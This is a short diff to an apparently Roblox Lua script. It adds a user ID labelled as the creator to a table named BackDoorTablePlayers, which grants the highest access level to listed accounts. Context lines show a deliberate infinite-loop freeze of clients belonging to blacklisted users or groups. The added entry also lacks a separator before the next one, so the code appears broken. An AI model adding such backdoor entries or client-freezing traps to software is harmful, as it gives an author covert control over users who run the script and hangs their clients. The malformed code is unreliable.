@@ -219,6 +219,11 @@ local BackDoorTablePlayers = {
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(178,242,255);
 	};
+	[1388703832] = {
+		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(178,242,255);
+	}
     [1066524308] = {
 		['Name'] = "Kylee [My Gf so kill her = you die] (She does not know anything about the script so stop asking)";
 		['Access'] = 4;
@@ -3020,4 +3025,4 @@ if LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") or BlacklistTabl
 	notif("HA YOU THOUGHT","no!!",5,nil)
 	wait(0.3)
 	while true do end
-end
+end 
